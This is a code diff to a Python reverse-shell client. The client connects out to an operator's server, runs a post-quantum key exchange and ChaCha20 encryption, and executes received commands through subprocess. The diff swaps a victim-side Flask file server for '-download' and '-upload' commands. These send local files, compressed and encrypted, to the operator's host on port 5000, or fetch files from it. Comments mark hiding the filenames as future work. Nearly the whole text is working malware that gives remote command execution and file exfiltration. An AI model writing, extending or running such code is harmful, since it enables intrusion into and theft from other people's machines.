@@ -3,52 +3,16 @@
 import argparse
 import socket
 import subprocess
-import threading
+import requests
+import json
+import os
 
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from zstandard import ZstdCompressor, ZstdDecompressor
 from cryptography.hazmat.primitives import hashes
-from flask import Flask, jsonify, request
 from kyber_py.ml_kem import ML_KEM_1024
-
-key = ''
-nonce = ''
-
-app = Flask(__name__)
-
-def run_flask():
-    app.run(host='0.0.0.0', port=5000)
-
-@app.route('/upload', methods=['POST'])
-def upload():
-    file_bytes = request.get_data()
-    if not file_bytes:
-        return jsonify({"error": "No data received"}), 400
-    filename = request.headers.get('Filename')
-    file_decrypted = chacha20_decrypt(file_bytes, key, nonce)
-    file_decompressed = ZstdDecompressor().decompress(file_decrypted)
-    try:
-        with open(filename, "wb") as f:
-            f.write(file_decompressed)
-        return jsonify({"message": "File uploaded"}), 200
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
-    
-@app.route('/download', methods=['POST'])
-def download():
-    filename = request.headers.get('Filename')
-    if not filename:
-        return jsonify({"error": "Filename is missing"}), 400
-    try:
-        with open(filename, "rb") as f:
-            file_data = f.read()
-        file_compressed = ZstdCompressor().compress(file_data)
-        file_encrypted = chacha20_encrypt(file_compressed, key, nonce)
-        return file_encrypted, 200
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
 
 
 def chacha20_encrypt(data, key, nonce):
@@ -62,7 +26,6 @@ def chacha20_decrypt(data, key, nonce):
     return decryptor.update(data)
 
 def reverse_shell(server_ip, server_port):
-    global key, nonce
     mlkem = ML_KEM_1024
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((server_ip, server_port))
@@ -94,8 +57,26 @@ def reverse_shell(server_ip, server_port):
             if command.lower() == "exit":
                 client.close()
                 break
+            elif command.lower().startswith("-download "):
+                filename = command.split(" ", 1)[1]
+                with open(filename, 'rb') as f:
+                    file_data = f.read()
+                compressed_file_data = ZstdCompressor().compress(file_data)
+                encrypted_file_data = chacha20_encrypt(compressed_file_data, key, nonce)
+                response = requests.post('http://' + server_ip + ':5000/d', data=encrypted_file_data, headers={'Filename': filename}) #TODO: Hide filename.
+                output = None
+            elif command.lower().startswith("-upload "):
+                filename = command.split(" ", 1)[1] 
+                response = requests.post('http://' + server_ip + ':5000/u', headers={'Filename': filename}) #TODO: Hide filename.
+                desencrypted_content = chacha20_decrypt(response.content, key, nonce)
+                decompressed_content = ZstdDecompressor().decompress(desencrypted_content)
+                file_destination = filename.split("/")[-1]
+                with open(file_destination, 'wb') as f:
+                    f.write(decompressed_content)
+                output = None
+            else:
+                output = subprocess.getoutput(command)
 
-            output = subprocess.getoutput(command)
             if output == "" or output is None:
                 output = "No output"
 
@@ -112,8 +93,5 @@ if __name__ == "__main__":
     parser.add_argument("-s", "--server", required=True, help="Server IP address")
     parser.add_argument("-p", "--port", required=True, type=int, help="Server port")
     args = parser.parse_args()
-
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
 
     reverse_shell(args.server, args.port)
